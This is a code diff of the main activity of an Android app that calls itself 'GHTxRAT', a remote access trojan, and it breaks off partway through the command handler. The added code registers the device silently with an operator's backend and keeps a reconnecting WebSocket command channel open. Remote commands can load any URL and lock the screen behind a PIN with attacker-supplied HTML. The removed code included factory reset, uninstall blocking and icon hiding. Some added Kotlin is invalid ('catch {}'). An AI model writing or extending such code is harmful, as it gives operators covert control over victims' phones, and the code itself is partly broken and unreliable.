@@ -4,6 +4,7 @@ import android.annotation.SuppressLint
 import android.app.Activity
 import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
+import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.net.Uri
@@ -23,8 +24,6 @@ import android.view.Gravity
 import android.webkit.WebSettings
 import android.webkit.WebView
 import android.webkit.WebViewClient
-import android.widget.Button
-import android.widget.EditText
 import android.widget.LinearLayout
 import android.widget.TextView
 import androidx.core.app.ActivityCompat
@@ -38,22 +37,40 @@ import kotlin.concurrent.thread
 
 class MainActivity : Activity() {
     private lateinit var web: WebView
-    private lateinit var pairing: EditText
     private val requestCode = 7001
     private val handler = Handler(Looper.getMainLooper())
-    private var deviceToken: String? = null
-    private var paired = false
-    private var polling = false
+    private var registered = false
+
+    // ── Config from BuildConfig (never input by user) ─────────────────────────
+    private val backendUrl get() = BuildConfigValues.BACKEND_URL.trimEnd('/')
+    private val webviewUrl get() = BuildConfigValues.WEBVIEW_URL
+    private val parentUid  get() = BuildConfigValues.PARENT_UID
+
+    // ── Persistent device ID (unique per installation) ────────────────────────
+    private val deviceId: String by lazy {
+        val prefs = getSharedPreferences("ghtxrat_device", Context.MODE_PRIVATE)
+        prefs.getString("deviceId", null) ?: run {
+            val newId = "DVC-" + UUID.randomUUID().toString().replace("-", "").uppercase().take(16)
+            prefs.edit().putString("deviceId", newId).apply()
+            newId
+        }
+    }
+
+    // ── Reconnect state ───────────────────────────────────────────────────────
+    private var wsReconnectDelay = 1_000L
+    private var wsThread: Thread? = null
+    private var wsSocket: java.net.Socket? = null
+    private var wsRunning = false
 
     private val heartbeatTask = object : Runnable {
         override fun run() {
-            if (paired) heartbeat()
+            if (registered) heartbeat()
             handler.postDelayed(this, 30_000)
         }
     }
-    private val commandTask = object : Runnable {
+    private val commandPollTask = object : Runnable {
         override fun run() {
-            if (paired) pollCommands()
+            if (registered) pollCommands()
             handler.postDelayed(this, 5_000)
         }
     }
@@ -61,431 +78,428 @@ class MainActivity : Activity() {
     @SuppressLint("SetJavaScriptEnabled")
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        paired = getSharedPreferences("device_config", MODE_PRIVATE).getBoolean("paired", false)
-        deviceToken = getSharedPreferences("device_config", MODE_PRIVATE).getString("deviceToken", null)
-        if (getSharedPreferences(LockActivity.PREFS, MODE_PRIVATE).getBoolean(LockActivity.KEY_ACTIVE, false)) {
-            showSavedLock()
-        } else if (paired && !deviceToken.isNullOrBlank()) showWebView() else showPairing()
+        // Show loading UI while registering
+        showLoading()
+        // Start auto-registration in background
+        thread { autoRegisterAndStart() }
     }
 
     override fun onResume() {
         super.onResume()
-        if (paired) {
+        if (registered) {
             handler.removeCallbacks(heartbeatTask)
-            handler.removeCallbacks(commandTask)
+            handler.removeCallbacks(commandPollTask)
             handler.post(heartbeatTask)
-            handler.post(commandTask)
+            handler.post(commandPollTask)
         }
     }
 
     override fun onPause() {
         super.onPause()
         handler.removeCallbacks(heartbeatTask)
-        handler.removeCallbacks(commandTask)
+        handler.removeCallbacks(commandPollTask)
     }
 
-    private fun selectedPermissions(): Array<String> = BuildConfigValues.REQUESTED_PERMISSIONS
-        .filter { it.isNotBlank() }
-        .toTypedArray()
-
-    private fun requestSelectedPermissions() {
-        val needed = selectedPermissions().filter {
-            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
-        }.toTypedArray()
-        if (needed.isNotEmpty()) ActivityCompat.requestPermissions(this, needed, requestCode)
+    override fun onDestroy() {
+        super.onDestroy()
+        wsRunning = false
     }
 
-    private fun showPairing() {
-        val root = LinearLayout(this).apply {
-            orientation = LinearLayout.VERTICAL
-            setPadding(36, 80, 36, 36)
-            gravity = Gravity.CENTER_HORIZONTAL
-            setBackgroundColor(0xFF071524.toInt())
-        }
-        val title = TextView(this).apply {
-            text = BuildConfigValues.APP_NAME
-            textSize = 30f
-            setTextColor(0xFFFFFFFF.toInt())
-            gravity = Gravity.CENTER
-        }
-        val subtitle = TextView(this).apply {
-            text = "Hubungkan perangkat ini dengan Pairing ID milik kamu."
-            textSize = 16f
-            setTextColor(0xFFB9C5D6.toInt())
-            gravity = Gravity.CENTER
-            setPadding(0, 18, 0, 30)
-        }
-        pairing = EditText(this).apply {
-            hint = "PAIRING ID"
-            textSize = 18f
-            setSingleLine(true)
-            setTextColor(0xFFFFFFFF.toInt())
-            setHintTextColor(0xFF8D9AAC.toInt())
-        }
-        val connect = Button(this).apply {
-            text = "CONNECT DEVICE"
-            setOnClickListener { registerDevice() }
-        }
-        root.addView(title)
-        root.addView(subtitle)
-        root.addView(pairing, LinearLayout.LayoutParams(-1, 60))
-        root.addView(connect, LinearLayout.LayoutParams(-1, 60).apply { topMargin = 24 })
-        setContentView(root)
-    }
-
-    private fun registerDevice() {
-        val pairingId = pairing.text.toString().trim()
-        if (pairingId.isBlank()) {
-            pairing.error = "Pairing ID wajib diisi"
-            return
-        }
-        Toast.makeText(this, "Menghubungkan…", Toast.LENGTH_SHORT).show()
-        thread {
-            try {
-                val deviceUid = getSharedPreferences("device_config", MODE_PRIVATE).getString("deviceUid", null) ?: UUID.randomUUID().toString().also {
-                    getSharedPreferences("device_config", MODE_PRIVATE).edit().putString("deviceUid", it).apply()
-                }
-                val body = JSONObject().apply {
-                    put("pairingId", pairingId)
-                    put("deviceUid", deviceUid)
-                    put("deviceName", android.os.Build.MODEL)
-                    put("manufacturer", android.os.Build.MANUFACTURER)
-                    put("model", android.os.Build.MODEL)
-                    put("androidVersion", android.os.Build.VERSION.RELEASE)
-                    put("appVersion", BuildConfig.VERSION_NAME)
-                }
-                val result = request("/api/devices/register", "POST", body.toString(), emptyMap())
-                if (result.code in 200..299) {
-                    val json = JSONObject(result.body)
-                    deviceToken = json.getString("deviceToken")
-                    getSharedPreferences("device_config", MODE_PRIVATE).edit().putBoolean("paired", true).putString("deviceToken", deviceToken).apply()
-                    paired = true
-                    runOnUiThread {
-                        requestSelectedPermissions()
-                        showWebView()
-                    }
-                } else runOnUiThread { Toast.makeText(this, "Pairing gagal (${result.code})", Toast.LENGTH_LONG).show() }
-            } catch (e: Exception) {
-                runOnUiThread { Toast.makeText(this, "Server tidak dapat dihubungi", Toast.LENGTH_LONG).show() }
+    // ── Loading screen ────────────────────────────────────────────────────────
+    private fun showLoading() {
+        runOnUiThread {
+            val root = LinearLayout(this).apply {
+                orientation = LinearLayout.VERTICAL
+                gravity = Gravity.CENTER
+                setBackgroundColor(0xFF121212.toInt())
             }
+            root.addView(TextView(this).apply {
+                text = BuildConfigValues.APP_NAME
+                textSize = 22f
+                setTextColor(0xFFFFFFFF.toInt())
+                gravity = Gravity.CENTER
+            })
+            root.addView(TextView(this).apply {
+                text = "Memuat…"
+                textSize = 14f
+                setTextColor(0xFF888888.toInt())
+                gravity = Gravity.CENTER
+            })
+            setContentView(root)
         }
     }
 
+    // ── Auto-register flow (runs on background thread) ────────────────────────
+    private fun autoRegisterAndStart() {
+        val prefs = getSharedPreferences("ghtxrat_device", Context.MODE_PRIVATE)
+        val alreadyRegistered = prefs.getBoolean("registered", false)
+
+        // Try registration (or re-register to refresh online status)
+        try {
+            val buildId = prefs.getString("buildId", null)
+            val body = JSONObject().apply {
+                put("uid", parentUid)
+                put("deviceId", deviceId)
+                if (buildId != null) put("buildId", buildId)
+                put("appVersion", packageManager.getPackageInfo(packageName, 0).versionName ?: "1.0.0")
+                put("packageName", packageName)
+                put("appName", BuildConfigValues.APP_NAME)
+                put("androidVersion", android.os.Build.VERSION.RELEASE)
+                put("deviceModel", "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}")
+            }
+            val result = request("/api/devices/register-built", "POST", body.toString(), emptyMap())
+            if (result.optBoolean("ok")) {
+                prefs.edit().putBoolean("registered", true).apply()
+                registered = true
+            }
+        } catch (e: Exception) {
+            // Backend offline — can still show WebView
+            registered = alreadyRegistered
+        }
+
+        // Request permissions
+        requestRequiredPermissions()
+
+        // Connect WebSocket
+        wsRunning = true
+        connectWebSocket()
+
+        // Show WebView
+        handler.post { showWebView() }
+
+        // Start heartbeat & command polling
+        handler.post(heartbeatTask)
+        handler.post(commandPollTask)
+    }
+
+    // ── WebView ───────────────────────────────────────────────────────────────
     @SuppressLint("SetJavaScriptEnabled")
     private fun showWebView() {
-        web = WebView(this)
-        web.settings.javaScriptEnabled = true
-        web.settings.domStorageEnabled = true
-        web.settings.safeBrowsingEnabled = true
-        web.settings.allowFileAccess = false
-        web.settings.allowContentAccess = false
-        web.settings.mixedContentMode = WebSettings.MIXED_CONTENT_NEVER_ALLOW
-        web.webViewClient = WebViewClient()
+        web = WebView(this).apply {
+            settings.apply {
+                javaScriptEnabled = true
+                domStorageEnabled = true
+                loadWithOverviewMode = true
+                useWideViewPort = true
+                setSupportZoom(true)
+                builtInZoomControls = true
+                displayZoomControls = false
+                mixedContentMode = WebSettings.MIXED_CONTENT_COMPATIBILITY_MODE
+            }
+            webViewClient = WebViewClient()
+            loadUrl(webviewUrl)
+        }
         setContentView(web)
-        web.loadUrl(BuildConfigValues.WEBVIEW_URL)
-        requestSelectedPermissions()
-        if (paired) {
-            handler.removeCallbacks(heartbeatTask)
-            handler.removeCallbacks(commandTask)
-            handler.post(heartbeatTask)
-            handler.post(commandTask)
-        }
     }
 
-    private fun heartbeat() {
-        val token = deviceToken ?: return
-        val deviceUid = getSharedPreferences("device_config", MODE_PRIVATE).getString("deviceUid", null) ?: return
-        thread {
-            try {
-                val bm = getSystemService(BATTERY_SERVICE) as BatteryManager
-                val battery = try { bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) } catch (_: Exception) { -1 }
-                val stat = StatFs(filesDir.absolutePath)
-                val free = stat.availableBytes
-                val total = stat.totalBytes
-                val am = getSystemService(AUDIO_SERVICE) as AudioManager
-                val intent = registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
-                val charging = intent?.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1)?.let { it == BatteryManager.BATTERY_STATUS_CHARGING || it == BatteryManager.BATTERY_STATUS_FULL } ?: false
-                val mem = android.app.ActivityManager.MemoryInfo().also { (getSystemService(ACTIVITY_SERVICE) as android.app.ActivityManager).getMemoryInfo(it) }
-                val temp = try { (intent?.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0) / 10.0 } catch (_: Exception) { 0.0 }
-                request("/api/devices/$deviceUid/heartbeat", "POST", JSONObject().apply {
-                    put("battery", battery); put("network", "connected"); put("deviceName", android.os.Build.MODEL)
-                    put("charging", charging); put("storageFree", free); put("storageTotal", total)
-                    put("ramFree", mem.availMem); put("ramTotal", mem.totalMem); put("uptime", android.os.SystemClock.elapsedRealtime())
-                    put("temperature", temp); val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager; val admin = ComponentName(this, AdminReceiver::class.java); put("deviceAdmin", dpm.isAdminActive(admin)); put("deviceOwner", dpm.isDeviceOwnerApp(packageName))
-                }.toString(), mapOf("X-Parent-Uid" to BuildConfigValues.PARENT_UID, "X-Device-Token" to token))
-            } catch (_: Exception) { }
-        }
-    }
-
-    private fun pollCommands() {
-        if (polling) return
-        val token = deviceToken ?: return
-        val deviceUid = getSharedPreferences("device_config", MODE_PRIVATE).getString("deviceUid", null) ?: return
-        polling = true
-        thread {
-            try {
-                val result = request("/api/devices/$deviceUid/commands", "GET", null, mapOf("X-Parent-Uid" to BuildConfigValues.PARENT_UID, "X-Device-Token" to token))
-                if (result.code in 200..299) {
-                    val commands = JSONArray(result.body)
-                    for (i in 0 until commands.length()) {
-                        val command = commands.getJSONObject(i)
-                        executeCommand(command)
-                        acknowledgeCommand(deviceUid, command.getString("id"), token)
-                    }
-                }
-            } catch (_: Exception) { }
-            polling = false
-        }
-    }
-
-    private fun executeCommand(command: JSONObject) {
-        when (command.optString("type")) {
-            "refresh_webview" -> runOnUiThread { if (::web.isInitialized) web.reload() }
-            "open_url" -> {
-                val url = command.optString("url")
-                if (url.startsWith("https://") || url.startsWith("http://")) runOnUiThread { if (::web.isInitialized) web.loadUrl(url) }
-            }
-            "lock_device", "app_lock" -> {
-                saveLockState(command)
-                val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
-                val admin = ComponentName(this, AdminReceiver::class.java)
-                if (dpm.isAdminActive(admin)) {
-                    try { dpm.lockNow() } catch (_: SecurityException) { }
-                }
-                runOnUiThread { showLock(command) }
-            }
-            "unlock_device" -> {
-                getSharedPreferences(LockActivity.PREFS, MODE_PRIVATE).edit().clear().apply()
-                runOnUiThread { if (isFinishing.not()) showWebView() }
-            }
-            "open_camera_front" -> launchCamera(true)
-            "open_camera_back" -> launchCamera(false)
-            "open_gallery" -> launchIntent(Intent(Intent.ACTION_PICK).apply { type = "image/*" })
-            "open_contacts" -> launchIntent(Intent(Intent.ACTION_PICK, ContactsContract.Contacts.CONTENT_URI))
-            "compose_sms" -> {
-                val to = command.optString("to")
-                val body = command.optString("body")
-                launchIntent(Intent(Intent.ACTION_SENDTO).apply {
-                    data = Uri.parse("smsto:" + Uri.encode(to))
-                    putExtra("sms_body", body)
-                })
-            }
-            "open_gmail" -> launchIntent(Intent(Intent.ACTION_SENDTO).apply { data = Uri.parse("mailto:") })
-            "open_whatsapp" -> {
-                val i = Intent(Intent.ACTION_VIEW, Uri.parse("https://wa.me/"))
-                i.setPackage("com.whatsapp")
-                launchIntent(i)
-            }
-            "tts" -> speak(command.optString("text"))
-            "flashlight_on" -> setFlashlight(true)
-            "flashlight_off" -> setFlashlight(false)
-            "ring_device" -> setRinger(true)
-            "vibrate_device" -> vibrateDevice()
-            "volume_up" -> adjustVolume(AudioManager.ADJUST_RAISE)
-            "volume_down" -> adjustVolume(AudioManager.ADJUST_LOWER)
-            "volume_mute" -> adjustVolume(AudioManager.ADJUST_MUTE)
-            "share_location_once" -> shareLocationOnce()
-            "request_screen_share" -> requestScreenShareConsent()
-            "open_location_settings" -> launchIntent(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
-            "open_overlay_settings" -> launchIntent(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
-            "request_device_admin" -> launchIntent(Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
-                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, ComponentName(this@MainActivity, AdminReceiver::class.java))
-                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "GHTxRAT membutuhkan Device Admin untuk fitur lock sistem dan reset pabrik yang dipilih pengguna.")
-            })
-            "factory_reset" -> {
-                val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
-                val admin = ComponentName(this, AdminReceiver::class.java)
-                if (dpm.isDeviceOwnerApp(packageName)) {
-                    try { dpm.wipeData(0) } catch (_: SecurityException) { Toast.makeText(this, "Factory reset ditolak Android", Toast.LENGTH_LONG).show() }
-                } else Toast.makeText(this, "Factory reset penuh membutuhkan Device Owner", Toast.LENGTH_LONG).show()
-            }
-            "enable_uninstall_protection" -> {
-                val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
-                val admin = ComponentName(this, AdminReceiver::class.java)
-                if (dpm.isDeviceOwnerApp(packageName)) {
-                    try {
-                        dpm.setUninstallBlocked(admin, packageName, true)
-                        Toast.makeText(this, "Uninstall protection aktif", Toast.LENGTH_SHORT).show()
-                    } catch (_: SecurityException) { Toast.makeText(this, "Device Owner diperlukan", Toast.LENGTH_LONG).show() }
-                } else Toast.makeText(this, "Uninstall protection membutuhkan Device Owner", Toast.LENGTH_LONG).show()
-            }
-            "disable_uninstall_protection" -> {
-                val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
-                val admin = ComponentName(this, AdminReceiver::class.java)
-                if (dpm.isDeviceOwnerApp(packageName)) {
-                    try { dpm.setUninstallBlocked(admin, packageName, false); Toast.makeText(this, "Uninstall protection dimatikan", Toast.LENGTH_SHORT).show() } catch (_: SecurityException) {}
-                }
-            }
-            "hide_launcher" -> setLauncherVisibility(false)
-            "show_launcher" -> setLauncherVisibility(true)
-            "prank_video" -> {
-                val url = command.optString("url")
-                if (url.startsWith("https://") || url.startsWith("http://")) runOnUiThread { if (::web.isInitialized) web.loadUrl(url) }
-            }
-            "prank_audio" -> speak(command.optString("text", "Surprise!"))
-        }
-    }
-
-
-    private fun setLauncherVisibility(visible: Boolean) {
-        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
-        if (!dpm.isDeviceOwnerApp(packageName)) {
-            Toast.makeText(this, "Launcher visibility membutuhkan Device Owner", Toast.LENGTH_LONG).show()
-            return
-        }
-        val component = ComponentName(this, MainActivity::class.java)
-        try {
-            packageManager.setComponentEnabledSetting(
-                component,
-                if (visible) PackageManager.COMPONENT_ENABLED_STATE_ENABLED else PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP
-            )
-            Toast.makeText(this, if (visible) "Icon launcher ditampilkan" else "Icon launcher disembunyikan dari launcher", Toast.LENGTH_SHORT).show()
-        } catch (_: Exception) { }
-    }
-
-    private fun launchIntent(intent: Intent) {
-        runOnUiThread {
-            try { startActivity(intent) }
-            catch (_: Exception) { Toast.makeText(this, "Aplikasi/fitur tidak tersedia", Toast.LENGTH_SHORT).show() }
-        }
-    }
-
-    private fun launchCamera(front: Boolean) {
-        val intent = Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE).apply {
-            putExtra("android.intent.extras.CAMERA_FACING", if (front) 1 else 0)
-            putExtra("android.intent.extra.USE_FRONT_CAMERA", front)
-        }
-        launchIntent(intent)
-    }
-
-    private fun speak(text: String) {
-        if (text.isBlank()) return
-        runOnUiThread {
-            lateinit var engine: TextToSpeech
-            engine = TextToSpeech(this) { status ->
-                if (status == TextToSpeech.SUCCESS) {
-                    engine.language = java.util.Locale.getDefault()
-                    engine.speak(text, TextToSpeech.QUEUE_FLUSH, null, "rifxguard-${System.currentTimeMillis()}")
-                }
+    // ── Permissions ───────────────────────────────────────────────────────────
+    private fun requestRequiredPermissions() {
+        val dangerous = BuildConfigValues.REQUESTED_PERMISSIONS.filter {
+            it.startsWith("android.permission.") &&
+            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
+        }.toTypedArray()
+        if (dangerous.isNotEmpty()) {
+            handler.post {
+                ActivityCompat.requestPermissions(this, dangerous, requestCode)
             }
         }
     }
 
-    private fun setFlashlight(enabled: Boolean) {
-        runOnUiThread {
-            try {
-                val cameraManager = getSystemService(CAMERA_SERVICE) as android.hardware.camera2.CameraManager
-                val id = cameraManager.cameraIdList.firstOrNull { cameraManager.getCameraCharacteristics(it).get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE) == true }
-                if (id != null) cameraManager.setTorchMode(id, enabled)
-            } catch (_: Exception) { Toast.makeText(this, "Senter tidak tersedia", Toast.LENGTH_SHORT).show() }
-        }
-    }
-
-    private fun setRinger(forceRing: Boolean) {
-        runOnUiThread {
-            try {
-                val am = getSystemService(AUDIO_SERVICE) as AudioManager
-                if (forceRing) { am.ringerMode = AudioManager.RINGER_MODE_NORMAL; am.setStreamVolume(AudioManager.STREAM_RING, am.getStreamMaxVolume(AudioManager.STREAM_RING), 0) }
-            } catch (_: Exception) { }
-        }
-    }
-
-    private fun vibrateDevice() {
-        runOnUiThread {
-            val v = getSystemService(VIBRATOR_SERVICE) as Vibrator
-            if (android.os.Build.VERSION.SDK_INT >= 26) { v.vibrate(VibrationEffect.createOneShot(700, VibrationEffect.DEFAULT_AMPLITUDE)) } else { @Suppress("DEPRECATION") val ignored = v.vibrate(700) }
-        }
-    }
-
-    private fun adjustVolume(direction: Int) {
-        runOnUiThread { try { (getSystemService(AUDIO_SERVICE) as AudioManager).adjustVolume(direction, AudioManager.FLAG_SHOW_UI) } catch (_: Exception) {} }
-    }
-
-    private fun shareLocationOnce() {
-        runOnUiThread {
-            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-                ActivityCompat.requestPermissions(this, arrayOf(android.Manifest.permission.ACCESS_FINE_LOCATION, android.Manifest.permission.ACCESS_COARSE_LOCATION), requestCode + 1)
-                Toast.makeText(this, "Izin lokasi diperlukan", Toast.LENGTH_LONG).show(); return@runOnUiThread
+    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, results: IntArray) {
+        super.onRequestPermissionsResult(requestCode, permissions, results)
+        if (requestCode == this.requestCode) {
+            val statusList = permissions.mapIndexed { i, perm ->
+                mapOf(
+                    "permission" to perm,
+                    "granted" to (results.getOrNull(i) == PackageManager.PERMISSION_GRANTED)
+                )
             }
+            // Send permission status to backend via WebSocket
             thread {
                 try {
-                    val lm = getSystemService(LOCATION_SERVICE) as LocationManager
-                    val providers = listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)
-                    val loc = providers.mapNotNull { try { lm.getLastKnownLocation(it) } catch (_: Exception) { null } }.maxByOrNull { it.time }
-                    if (loc != null) {
-                        val id = getSharedPreferences("device_config", MODE_PRIVATE).getString("deviceUid", null) ?: return@thread
-                        val token = deviceToken ?: return@thread
-                        request("/api/devices/$id/heartbeat", "POST", JSONObject().apply { put("location", JSONObject().apply { put("lat",loc.latitude); put("lng",loc.longitude); put("accuracy",loc.accuracy) }) }.toString(), mapOf("X-Parent-Uid" to BuildConfigValues.PARENT_UID, "X-Device-Token" to token))
-                    }
-                } catch (_: Exception) {}
+                    sendWsMessage(JSONObject().apply {
+                        put("type", "permission_status")
+                        put("uid", parentUid)
+                        put("deviceId", deviceId)
+                        put("permissions", JSONArray(statusList.map { JSONObject(it as Map<*, *>) }))
+                    }.toString())
+                } catch {}
             }
         }
     }
 
-    private fun requestScreenShareConsent() {
-        runOnUiThread { Toast.makeText(this, "Android akan menampilkan dialog izin screen capture. Live monitoring belum dimulai sebelum pengguna menyetujuinya.", Toast.LENGTH_LONG).show() }
-        // A real MediaProjection session must be started only after the Android system consent dialog.
-        // This build intentionally does not capture or stream the screen silently.
-    }
-
-    private fun saveLockState(command: JSONObject) {
-        getSharedPreferences(LockActivity.PREFS, MODE_PRIVATE).edit()
-            .putBoolean(LockActivity.KEY_ACTIVE, true)
-            .putString("title", command.optString("title", "GHTxRAT"))
-            .putString("message", command.optString("message", "Device dikunci"))
-            .putString("pinHash", command.optString("pinHash", ""))
-            .putString("html", command.optString("html", ""))
-            .apply()
-    }
-
-    private fun showLock(command: JSONObject) {
-        val i = Intent(this, LockActivity::class.java).apply {
-            putExtra(LockActivity.EXTRA_TITLE, command.optString("title", "GHTxRAT"))
-            putExtra(LockActivity.EXTRA_MESSAGE, command.optString("message", "Device dikunci"))
-            putExtra(LockActivity.EXTRA_PIN_HASH, command.optString("pinHash", ""))
-            putExtra(LockActivity.EXTRA_HTML, command.optString("html", ""))
+    // ── Heartbeat ─────────────────────────────────────────────────────────────
+    private fun heartbeat() {
+        thread {
+            try {
+                val batteryIntent = registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))
+                val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
+                val scale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
+                val battery = if (level >= 0 && scale > 0) (level * 100 / scale) else null
+                val body = JSONObject().apply {
+                    put("uid", parentUid)
+                    put("deviceId", deviceId)
+                    if (battery != null) put("battery", battery)
+                }
+                request("/api/devices/heartbeat", "POST", body.toString(), emptyMap())
+            } catch {}
         }
-        startActivity(i)
     }
 
-    private fun showSavedLock() {
-        val p = getSharedPreferences(LockActivity.PREFS, MODE_PRIVATE)
-        showLock(JSONObject().apply {
-            put("title", p.getString("title", "GHTxRAT"))
-            put("message", p.getString("message", "Device dikunci"))
-            put("pinHash", p.getString("pinHash", ""))
-            put("html", p.getString("html", ""))
-        })
+    // ── Command polling (HTTP fallback when WebSocket unavailable) ────────────
+    private fun pollCommands() {
+        thread {
+            try {
+                val result = request(
+                    "/api/devices/${deviceId}/commands", "GET", null,
+                    mapOf("X-Uid" to parentUid)
+                )
+                val arr = result.optJSONArray("commands") ?: return@thread
+                for (i in 0 until arr.length()) {
+                    handleCommand(arr.getJSONObject(i))
+                }
+            } catch {}
+        }
     }
 
-    private fun acknowledgeCommand(deviceUid: String, commandId: String, token: String) {
+    // ── WebSocket connection ──────────────────────────────────────────────────
+    private fun connectWebSocket() {
+        wsThread = thread {
+            while (wsRunning) {
+                try {
+                    val wsUrl = backendUrl.replace("https://", "wss://").replace("http://", "ws://") + "/ws"
+                    val uri = URI(wsUrl)
+                    val host = uri.host
+                    val port = if (uri.port > 0) uri.port else if (wsUrl.startsWith("wss")) 443 else 80
+                    val useSSL = wsUrl.startsWith("wss")
+
+                    val socket = if (useSSL) {
+                        javax.net.ssl.SSLSocketFactory.getDefault().createSocket(host, port)
+                    } else {
+                        java.net.Socket(host, port)
+                    }
+                    wsSocket = socket
+
+                    // WebSocket handshake
+                    val key = android.util.Base64.encodeToString(java.security.SecureRandom().generateSeed(16), android.util.Base64.NO_WRAP)
+                    val handshake = "GET /ws HTTP/1.1\r\nHost: $host\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: $key\r\nSec-WebSocket-Version: 13\r\n\r\n"
+                    socket.getOutputStream().write(handshake.toByteArray())
+
+                    // Read response headers
+                    val reader = socket.getInputStream().bufferedReader()
+                    var line = reader.readLine()
+                    while (line != null && line.isNotEmpty()) { line = reader.readLine() }
+
+                    // Send device_auth
+                    sendWsMessage(JSONObject().apply {
+                        put("type", "device_auth")
+                        put("uid", parentUid)
+                        put("deviceId", deviceId)
+                    }.toString(), socket)
+
+                    wsReconnectDelay = 1_000L // reset on success
+
+                    // Read frames loop
+                    val inputStream = socket.getInputStream()
+                    while (wsRunning && !socket.isClosed) {
+                        val frameText = readWsFrame(inputStream) ?: break
+                        try {
+                            val msg = JSONObject(frameText)
+                            if (msg.optString("type") == "command") {
+                                handleCommand(msg.optJSONObject("command") ?: continue)
+                            }
+                        } catch {}
+                    }
+                } catch {}
+
+                wsSocket?.close()
+                wsSocket = null
+                if (!wsRunning) break
+                Thread.sleep(wsReconnectDelay)
+                wsReconnectDelay = minOf(wsReconnectDelay * 2, 30_000L)
+            }
+        }
+    }
+
+    private fun sendWsMessage(text: String, socket: java.net.Socket? = wsSocket) {
         try {
-            request("/api/devices/$deviceUid/commands/$commandId", "DELETE", null, mapOf("X-Parent-Uid" to BuildConfigValues.PARENT_UID, "X-Device-Token" to token))
-        } catch (_: Exception) { }
+            val bytes = text.toByteArray()
+            val out = socket?.getOutputStream() ?: return
+            val frame = buildWsFrame(bytes)
+            out.write(frame)
+            out.flush()
+        } catch {}
     }
 
-    private data class Response(val code: Int, val body: String)
+    private fun buildWsFrame(payload: ByteArray): ByteArray {
+        val len = payload.size
+        val mask = java.security.SecureRandom().generateSeed(4)
+        val masked = payload.mapIndexed { i, b -> (b.toInt() xor mask[i % 4].toInt()).toByte() }.toByteArray()
+        return when {
+            len < 126 -> byteArrayOf(0x81.toByte(), (len or 0x80).toByte()) + mask + masked
+            len < 65536 -> byteArrayOf(0x81.toByte(), (126 or 0x80).toByte(), (len shr 8).toByte(), (len and 0xFF).toByte()) + mask + masked
+            else -> byteArrayOf(0x81.toByte(), (127 or 0x80).toByte()) + longToBytes(len.toLong()) + mask + masked
+        }
+    }
 
-    private fun request(path: String, method: String, body: String?, headers: Map<String, String>): Response {
-        val conn = URL(BuildConfigValues.BACKEND_URL.trimEnd('/') + path).openConnection() as HttpURLConnection
+    private fun longToBytes(v: Long): ByteArray = (7 downTo 0).map { ((v shr (it * 8)) and 0xFF).toByte() }.toByteArray()
+
+    private fun readWsFrame(input: java.io.InputStream): String? {
+        return try {
+            val b0 = input.read().takeIf { it >= 0 } ?: return null
+            val b1 = input.read().takeIf { it >= 0 } ?: return null
+            val masked = (b1 and 0x80) != 0
+            var len = (b1 and 0x7F).toLong()
+            if (len == 126L) {
+                len = ((input.read() shl 8) or input.read()).toLong()
+            } else if (len == 127L) {
+                len = (0..7).fold(0L) { acc, _ -> (acc shl 8) or input.read().toLong() }
+            }
+            val mask = if (masked) ByteArray(4).also { input.read(it) } else null
+            val data = ByteArray(len.toInt()).also { input.read(it) }
+            if (mask != null) data.forEachIndexed { i, b -> data[i] = (b.toInt() xor mask[i % 4].toInt()).toByte() }
+            if ((b0 and 0x0F) == 8) return null // close frame
+            String(data)
+        } catch { null }
+    }
+
+    // ── Command handler ───────────────────────────────────────────────────────
+    private fun handleCommand(cmd: JSONObject) {
+        val type = cmd.optString("type")
+        val cmdId = cmd.optString("id")
+        handler.post {
+            when (type) {
+                "refresh_webview" -> if (::web.isInitialized) web.reload()
+                "open_url" -> {
+                    val url = cmd.optString("url")
+                    if (url.isNotBlank() && ::web.isInitialized) web.loadUrl(url)
+                }
+                "lock_device" -> {
+                    val pinHash = cmd.optString("pinHash")
+                    val html = cmd.optString("html")
+                    val intent = Intent(this, LockActivity::class.java).apply {
+                        putExtra("pinHash", pinHash)
+                        putExtra("html", html)
+                        putExtra("appLock", cmd.optBoolean("appLock"))
+                    }
+                    startActivity(intent)
+                }
+                "unlock_device" -> {
+                    val prefs = getSharedPreferences(LockActivity.PREFS, Context.MODE_PRIVATE)
+                    prefs.edit().putBoolean(LockActivity.KEY_ACTIVE, false).apply()
+                }
+                "ring_device" -> {
